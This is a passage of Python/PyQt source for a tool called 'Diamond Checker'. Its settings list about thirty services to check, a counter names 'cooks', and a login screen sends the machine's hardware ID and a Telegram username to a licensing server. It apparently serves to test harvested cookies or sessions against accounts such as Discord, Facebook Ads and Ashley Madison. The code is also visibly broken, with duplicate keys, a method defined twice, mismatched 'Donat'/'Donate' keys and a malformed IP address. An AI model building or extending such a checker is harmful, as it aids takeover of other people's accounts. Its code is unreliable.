        settings['services']['DISCORD'] = int(self.ui.checkBox_discord.checkState())
        settings['services']['VK'] = int(self.ui.checkBox_vk.checkState())
        settings['services']['FACEBOOK'] = int(self.ui.checkBox_facebook_ads.checkState())
        settings['services']['DISCORD'] = int(self.ui.checkBox_discord.checkState())
        settings['services']['SNAPCHATADS'] = int(self.ui.snapchat_ads_checkbox.checkState())
        settings['services']['MICROSOFTADS'] = int(self.ui.microsoft_ads_checkbox.checkState())
        settings['services']['TINDERADS'] = int(self.ui.tinder_ads_checkbox.checkState())
        settings['services']['TWITTERADS'] = int(self.ui.twitter_ads_checkbox.checkState())
        settings['services']['CRAIGSLISTADS'] = int(self.ui.craigslist_ads_checkbox.checkState())
        settings['services']['AIRBNB'] = int(self.ui.airbnb_checkbox.checkState())
        settings['services']['WALMART'] = int(self.ui.walmart_checkbox.checkState())
        settings['services']['UBEREATS'] = int(self.ui.uber_eats_checkbox.checkState())
        settings['services']['ZILLOW'] = int(self.ui.zillow_checkbox.checkState())
        settings['services']['FLIPKART'] = int(self.ui.flipkart_checkbox.checkState())
        settings['services']['DHGATE'] = int(self.ui.dh_gate_checkbox.checkState())
        settings['services']['INSTACART'] = int(self.ui.instacart_checkbox.checkState())
        settings['services']['ASHLEYMADISON'] = int(self.ui.ashley_madison_checkbox.checkState())
        settings['services']['ZOOSK'] = int(self.ui.zoosk_checkbox.checkState())
        settings['services']['CHRISTANMINGLE'] = int(self.ui.christan_mingle_checkbox.checkState())
        settings['services']['VINTED'] = int(self.ui.vinted_checkbox.checkState())
        settings['services']['BOOKING'] = int(self.ui.booking_checkbox.checkState())
        settings['services']['TEMU'] = int(self.ui.temu_checkbox.checkState())
        settings['services']['KICK'] = int(self.ui.kick_checkbox.checkState())
        settings['services']['MYSPACE'] = int(self.ui.myspace_checkbox.checkState())
        settings['services']['SNAPCHAT'] = int(self.ui.snapchat_ads_checkbox.checkState())
        settings['services']['TWITCH'] = int(self.ui.twitch_checkbox.checkState())
        settings['services']['LOCALS'] = int(self.ui.localsapp_checkbox.checkState())
        settings['services']['LINKEDIN'] = int(self.ui.linkedin_checkbox.checkState())
        settings['services']['HUMBLE'] = int(self.ui.checkBox_humble.checkState())


        Config().settings_write(settings)

        self.checking.start()

    def console(self, text):
        self.ui.textEdit_console.append(text)

    def progres_set(self, all_cooks):
        self.ui.progressBar.setRange(0, all_cooks)


class ConnectServerThread(QThread):
    signal_check_login = pyqtSignal(str)

    def __init__(self):
        QThread.__init__(self)

    def run(self):
        try:
            client_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client_sock.connect(('120.0.0.1', 5000))  # Replace with the correct IP address and port number

            data = json.dumps({"WHID": self.user_whid, "username": self.username})

            client_sock.send(data.encode())
            data = client_sock.recv(4096)
            data = data.decode()
            self.signal_check_login.emit(data)
            data = json.loads(data)
            client_sock.close()

        except ConnectionResetError:
            # Handle the connection reset error
            error_message = "The connection was forcibly closed by the remote host."
            self.signal_check_login.emit(json.dumps({"Donate": "0", "Messages": error_message}))

        except Exception as e:
            # Handle other exceptions
            error_message = f"An error occurred during the connection: {e}"
            self.signal_check_login.emit(json.dumps({"Donate": "0", "Messages": error_message}))

    def init_args(self, user_whid, username):
        self.user_whid = user_whid
        self.username = username


class LoginCheckedGUI(QtWidgets.QMainWindow):
    def __init__(self):
        super(LoginCheckedGUI, self).__init__()
        self.connect_server = ConnectServerThread()
        self.ui = LoginCheked_UI.Ui_MainWindow()
        self.ui.setupUi(self)
        self.init_UI()
        self.connect_server.signal_check_login.connect(self.openmessage)

    def init_UI(self):
        self.setWindowTitle('Diamond Checker - Login')
        self.setWindowIcon(QIcon('diamond.ico'))
        self.ui.lineEdit.setText("Telegram login")
        self.ui.pushButton.clicked.connect(self.check)

    def check(self):
        settings = Config().settings_reader()
        if settings["authorization"]["username"] == "":
            settings["authorization"]["username"] = self.ui.lineEdit.text()
            Config().settings_write(settings)

        user_whid = WMI().Win32_ComputerSystemProduct()[0].UUID
        self.connect_server.init_args(user_whid, settings["authorization"]["username"])
        self.connect_server.start()

        # Check if the checkbox is checked
        checkbox_state = self.ui.snapchat_checkbox.isChecked()
        settings['services']['SNAPCHATADS'] = int(checkbox_state)



    def openmessage(self, data):
        data = json.loads(data)
        donat = data.get("Donat")
        messages = data.get("Messages")
        if donat == "1":
            self.application2 = MainWindowChecker()
            self.application2.show()
            application.hide()
        else:
            settings = Config().settings_reader()
            settings["authorization"]["username"] = ""
            Config().settings_write(settings)
            window_donat = QMessageBox()
            window_donat.setWindowTitle("Status")
            window_donat.setText(messages)
            window_donat.setIcon(QMessageBox.Information)
            window_donat.setStandardButtons(QMessageBox.Ok)
            window_donat.exec_()



    def init_UI(self):
        # Create a Skip button
        self.skip_button = QtWidgets.QPushButton('Skip', self)
        self.skip_button.clicked.connect(self.skip_login)
        # Position the Skip button as needed
        self.skip_button.setGeometry(10, 10, 100, 30)

    def skip_login(self):
        # Implement the functionality to skip the login process
        # For example, you can open the main application window directly
        self.application2 = MainWindowChecker()
        self.application2.show()
        self.hide()


if __name__ == "__main__":
    print("Do not close this window while the program is running\nDo not close this window while the program is running.")
    app = QtWidgets.QApplication(sys.argv)
    application = LoginCheckedGUI()
    application.show()

    settings = Config().settings_reader()
    if settings["authorization"]["username"] != "":
        application.check()

    sys.exit(app.exec())
